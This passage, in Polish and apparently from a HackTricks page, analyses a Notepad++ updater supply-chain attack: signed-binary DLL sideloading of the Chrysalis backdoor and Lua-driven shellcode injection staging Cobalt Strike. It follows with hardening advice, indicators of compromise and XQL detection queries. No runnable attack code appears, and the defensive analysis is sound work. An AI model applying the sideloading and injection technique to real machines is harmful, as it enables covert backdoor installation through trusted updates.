2. **Spreparowany NSIS**: instalator pobiera/uruchamia payload i wykorzystuje dwa łańcuchy wykonania:
   - **Bring-your-own signed binary + sideload**: dołącz podpisany plik Bitdefender `BluetoothService.exe` i umieść złośliwy `log.dll` w jego ścieżce wyszukiwania. Po uruchomieniu podpisanego pliku Windows ładuje bocznie `log.dll`, który odszyfrowuje i ładuje refleksyjnie backdoora Chrysalis (chronionego przez Warbird + API hashing utrudniające statyczne wykrywanie).
   - **Skryptowe wstrzykiwanie shellcode**: NSIS wykonuje skompilowany skrypt Lua, który używa API Win32 (np. `EnumWindowStationsW`) do wstrzykiwania shellcode i przygotowania Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Wnioski dotyczące hardeningu/wykrywania dla dowolnego aktualizatora:
- Wymuszaj **weryfikację certyfikatu i podpisu** pobranego instalatora (przypnij podpisującego dostawcy, odrzucaj niezgodny CN/łańcuch) i podpisuj sam manifest aktualizacji (np. za pomocą XMLDSig). Blokuj przekierowania kontrolowane przez manifest, jeśli nie zostały zweryfikowane.
- Traktuj **sideloading własnego podpisanego pliku binarnego** jako punkt wykrywania po pobraniu: generuj alerty, gdy podpisany plik EXE dostawcy ładuje DLL o nazwie spoza kanonicznej ścieżki instalacji (np. Bitdefender ładuje `log.dll` z Temp/Downloads) oraz gdy aktualizator umieszcza w katalogu tymczasowym instalatory o podpisach innych niż dostawcy i je uruchamia.
- Monitoruj **artefakty charakterystyczne dla malware** zaobserwowane w tym łańcuchu (przydatne jako ogólne punkty odniesienia): mutex `Global\Jdhfv_1.0.1`, nietypowe zapisy `gup.exe` w `%TEMP%` oraz etapy wstrzykiwania shellcode sterowane przez Lua.
- Notepad++ zareagował, wzmacniając WinGUp w wersji v8.8.9 i nowszych: zwracany XML jest teraz podpisany (XMLDSig), a nowsze wersje wymuszają weryfikację certyfikatu i podpisu pobranego instalatora, zamiast ufać wyłącznie warstwie transportowej.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading podpisanego przez Bitdefender pliku EXE <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> uruchamiający instalator inny niż instalator Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Te wzorce można uogólnić na dowolny updater, który akceptuje niepodpisane manifests lub nie przypina podpisujących instalatory — przejęcie ruchu sieciowego + złośliwy installer + sideloading z własnym podpisem prowadzą do remote code execution pod przykrywką „zaufanych” aktualizacji.

---
## References
- [1] [Informacja – Netskope Client for Windows – lokalna eskalacja uprawnień przez nieautoryzowany serwer (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Informacja o bezpieczeństwie Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – wtyczka Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – klient/exploit IPC Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [Pwning ASUS DriverHub, MSI Center, Acer Control Centre i Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – lokalna eskalacja uprawnień przez zapisywalne pliki w agencie Checkmk](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – eskalacja uprawnień w agencie Windows](https://checkmk.com/werk/16361)
- [10] [PoCs sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – aktorzy państwowi wykorzystują łańcuch dostaw Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – aktualizacja dotycząca incydentu przejęcia infrastruktury](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – omijanie poprawki dla CVE-2025-0309 w Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – wykrywanie błędów eskalacji uprawnień w Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
